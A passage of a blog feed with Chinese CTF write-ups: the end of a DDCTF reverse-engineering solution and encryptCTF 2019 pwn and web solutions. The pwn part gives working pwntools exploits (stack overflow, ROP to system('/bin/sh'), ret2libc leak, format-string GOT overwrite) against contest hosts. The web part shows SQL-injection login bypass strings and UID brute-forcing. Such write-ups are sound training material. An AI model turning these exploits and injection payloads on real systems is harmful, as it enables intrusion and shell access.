class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v8, a2, a3);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v8);</span><br><span class="line">  sub_4069D6((__int64)&amp;v8);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4013E6((__int64)&amp;v8, <span class="number">10L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"WELL DONE!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"wrong answer"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个检查，第一个检查与第二题RE类似，就是检查是否0-9A-F，第二个检查使用了类似OLLVM的混淆，使用硬件断点跟踪输入的读取，发现在0x405FA3附近进行了读取，并且与某个值进行相减，如果相减不为0程序退出，相减为0后续还会读取输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v47 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (_BYTE *)(*(_QWORD *)vm.p_input)++;<span class="comment">// 读取输入0x12</span></span><br><span class="line">        **(_BYTE **)vm.field_10 -= *v4;         <span class="comment">// 0x79 - 0x12</span></span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">          v12 = <span class="number">162L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( !v47 )</span><br></pre></td></tr></table></figure><p>在0x405FC6下断点，例如输入1234567890,第一轮比较0x79和0x12，所以将输入改为7934567890继续看第二轮的比较（或者改寄存器），重复以上步骤得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000405FC4                 mov     eax, edx</span><br><span class="line">.text:0000000000405FC6                 sub     ecx, eax</span><br><span class="line">.text:0000000000405FC8                 mov     eax, ecx</span><br></pre></td></tr></table></figure><p>flag: DDCTF{79406C61E5EEF319CECEE2ED8498}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知论坛 &lt;a href=&quot;https://xz.aliyun.com/t/4887&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4887&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;DDCTF2019&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>encryptCTF2019-web&amp;pwn-writeup</title>
    <link href="https://4f-kira.github.io/2019/05/31/encryptCTF2019-web-pwn-writeup/"/>
    <id>https://4f-kira.github.io/2019/05/31/encryptCTF2019-web-pwn-writeup/</id>
    <published>2019-05-31T02:29:50.000Z</published>
    <updated>2019-05-31T03:30:54.205Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知论坛 <a href="https://xz.aliyun.com/t/4669" target="_blank" rel="noopener">https://xz.aliyun.com/t/4669</a></p><p>周中跟着大佬们打了一场国外的CTF，题目不是很难，不过很适合新人练练手。其中我AK了pwn和web的题目，pwn题难度较低，对我这些萌新十分友好，web带点脑洞，其中两题python站的题目还是不错的，可以借此熟悉一下<code>virtualenv</code>的操作和<code>ssti</code>注入。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/encryptCTF/pwn0&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+5Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How's the josh?"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;s1, <span class="string">"H!gh"</span>, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good! here's the flag"</span>);</span><br><span class="line">    print_flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your josh is low!\nBye!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：只要<code>s1</code>内容为<code>H!hg</code>即可getflag，那么直接在输入<code>s</code>的时候溢出覆盖<code>s1</code>就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># kira @ k1r4 in ~/pwn/encryptCTF on git:master x [14:04:34]</span><br><span class="line">$ nc 104.154.106.182 1234</span><br><span class="line">How&apos;s the josh?</span><br><span class="line">H!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!gh</span><br><span class="line">Good! here&apos;s the flag</span><br><span class="line">encryptCTF&#123;L3t5_R4!53_7h3_J05H&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/encryptCTF/pwn1&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-80h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Tell me your name: "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：程序没开canary，自带getshell的后门函数，直接栈溢出覆盖ret地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'104.154.106.182'</span>, <span class="number">2345</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">140</span>+p32(<span class="number">0x80484AD</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/encryptCTF/pwn2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"$ "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, <span class="string">"ls"</span>) )</span><br><span class="line">    run_command_ls();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bash: command not found: %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：题目里面自带<code>system</code>，直接栈溢出组ROP。先用<code>gets</code>读入<code>/bin/sh</code>，然后调用<code>system</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">p = remote(<span class="string">'104.154.106.182'</span>, <span class="number">3456</span>)</span><br><span class="line">pr = <span class="number">0x08048546</span> <span class="comment"># pop ebp ; ret</span></span><br><span class="line">bss = <span class="number">0x0804A040</span></span><br><span class="line">payload = p32(elf.plt[<span class="string">'gets'</span>])+p32(pr)+p32(bss)+p32(elf.plt[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(bss)</span><br><span class="line">p.sendlineafter(<span class="string">'$ '</span>,<span class="string">'a'</span>*<span class="number">44</span>+payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/encryptCTF/pwn3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+10h] [ebp-80h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I am hungry you have to feed me to win this challenge...\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now give me some sweet desert: "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：这次程序没有<code>system</code>函数，需要泄露libc地址，然后ret2libc，远程泄露<code>gets</code>地址最低三位是<code>e60</code>，可以查到libc版本为<code>libc6_2.19-0ubuntu6.14_i386</code>。首先构造一个ROP来泄露libc地址，然后返回<code>main</code>函数，这里有个坑点是第二次溢出需要填充的垃圾字符数量不一样，具体可以调试看看，然后再组一次ROP，调用<code>system</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">'./libc6_2.19-0ubuntu6.14_i386.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line">p = remote(<span class="string">'104.154.106.182'</span>, <span class="number">4567</span>)</span><br><span class="line">main = <span class="number">0x0804847D</span></span><br><span class="line">p.sendlineafter(<span class="string">': \n'</span>,<span class="string">'a'</span>*<span class="number">140</span>+p32(elf.plt[<span class="string">'puts'</span>])+p32(main)+p32(elf.got[<span class="string">'gets'</span>]))</span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.sym[<span class="string">'gets'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">p.sendlineafter(<span class="string">': \n'</span>,<span class="string">'a'</span>*<span class="number">132</span>+p32(libc.sym[<span class="string">'system'</span>])+p32(<span class="number">0</span>)+p32(libc.search(<span class="string">'/bin/sh'</span>).next()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/encryptCTF/pwn4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you swear to use this shell with responsility by the old gods and the new?\n"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\ni don't belive you!\n%s\n"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：题目开了canary，不能直接进行栈溢出。有一个很明显的格式化字符串漏洞，而且程序自带一个getshell的后门，可以用格式化字符串修改<code>printf@got.plt</code>为后门函数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ k1r4 in ~/pwn/encryptCTF on git:master x [19:33:56]</span><br><span class="line"><span class="meta">$</span> ./pwn4</span><br><span class="line">Do you swear to use this shell with responsility by the old gods and the new?</span><br><span class="line"></span><br><span class="line"><span class="meta">aaaa%</span>p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">aaaa(nil).0x2.(nil).0xffe571ce.0x1.0xc2.0x61616161.0x252e7025.0x70252e70.0x2e70252e</span><br><span class="line">i don't belive you!</span><br><span class="line"><span class="meta">aaaa%</span>p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br></pre></td></tr></table></figure><p>简单测试了一下，可以发现格式化字符的offset是7，因为程序是32位的，可以直接用<code>pwntools</code>的<code>fmtstr_payload</code>函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">p = remote(<span class="string">'104.154.106.182'</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">'printf'</span>]:<span class="number">0x0804853D</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">'new?\n'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Sweeeeeet"><a href="#Sweeeeeet" class="headerlink" title="Sweeeeeet"></a>Sweeeeeet</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Do you like sweets?</span><br><span class="line"></span><br><span class="line">http://104.154.106.182:8080</span><br><span class="line"></span><br><span class="line">author: codacker50</span><br></pre></td></tr></table></figure><p>在响应包头得到一个flag，但是提交提示incorrect。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: FLAG=encryptCTF%7By0u_c4nt_U53_m3%7D</span><br></pre></td></tr></table></figure><p>随后在请求包的cookie里面发现一个<code>UID=f899139df5e1059396431415e770c6dd</code>，查了一下为<code>md5(100)</code>，于是使用burp进行<code>0-999</code>md5后爆破UID</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111158-3e475b98-55be-1.png" alt=""></p><h3 id="Slash-Slash"><a href="#Slash-Slash" class="headerlink" title="Slash Slash"></a>Slash Slash</h3><p>题目给了一个flask站的源码，<a href="https://ctf.encryptcvs.cf/files/43338088b56bf932bed9511a18168fd9/handout_slashslash.7z" target="_blank" rel="noopener">https://ctf.encryptcvs.cf/files/43338088b56bf932bed9511a18168fd9/handout_slashslash.7z</a></p><p>查看<code>application.py</code>，发现flag应该写进环境变量，而且使用了<code>virtualenv</code>设置虚拟环境，题目还提供了<code>virtualenv</code>的学习视频。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> secret_key using python3 secrets module</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">app.secret_key = <span class="string">"9d367b3ba8e8654c6433379763e80c6e"</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Learn about virtualenv here:</span></span><br><span class="line"><span class="string">https://www.youtube.com/watch?v=N5vscPTWKOk&amp;list=PL-osiE80TeTt66h8cVpmbayBKlMTuS55y&amp;index=7</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">FLAG = os.getenv(<span class="string">"FLAG"</span>, <span class="string">"encryptCTF&#123;&#125;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/encryptCTF', methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">'flag'</span>: FLAG</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure><p>安装一下<code>virtualenv</code>，然后运行此虚拟环境，但是发现根本没有<code>$FLAG</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ k1r4 in ~/web/handout_slashslash/app [21:08:40]</span><br><span class="line"><span class="meta">$</span> source ./env/bin/activate</span><br><span class="line">(env)</span><br><span class="line"><span class="meta">#</span> kira @ k1r4 in ~/web/handout_slashslash/app [21:08:57]</span><br><span class="line"><span class="meta">$</span> echo $FLAG</span><br></pre></td></tr></table></figure><p>直接查看一下<code>activate</code>文件，发现最后有一句被注销掉了，<code>RkxBRwo=</code>解码就是<code>FLAG</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(echo RkxBRwo= | base64 -d)=&quot;ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg==&quot;</span><br></pre></td></tr></table></figure><p>那么直接解base64就getflag了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kira @ k1r4 in ~/web/handout_slashslash/app [21:09:01]</span><br><span class="line">$ echo ZW5jcnlwdENURntjb21tZW50c18mX2luZGVudGF0aW9uc19tYWtlc19qb2hubnlfYV9nb29kX3Byb2dyYW1tZXJ9Cg==|base64 -d</span><br><span class="line">encryptCTF&#123;comments_&amp;_indentations_makes_johnny_a_good_programmer&#125;</span><br></pre></td></tr></table></figure><p>当然，将此行注销去掉，然后修改一下代码为<code>FLAG = os.getenv(&quot;FLAG&quot;)</code>，就可以通过访问<code>http://127.0.0.1:5000/encryptCTF</code>得到flag</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190403111224-4d578c8e-55be-1.png" alt=""></p><p><code>virtualenv</code>的使用教程可以参考以下<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432712108300322c61f256c74803b43bfd65c6f8d0d0000" target="_blank" rel="noopener">链接</a></p><h3 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i heard you are good at breaking codes, can you crack this vault?</span><br><span class="line"></span><br><span class="line">http://104.154.106.182:9090</span><br><span class="line"></span><br><span class="line">author: codacker</span><br></pre></td></tr></table></figure><p>打开地址后为一个登陆界面，随手试了一发万能密码<code>username=123&#39; or 1#&amp;password=123&#39; or 1#</code>，成功登陆，返回一个二维码，扫描后为一个YouTube地址。</p><p>猜想flag可能存在数据库，手工测试一下发现可以注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=123&apos; or 1=1#&amp;password=123 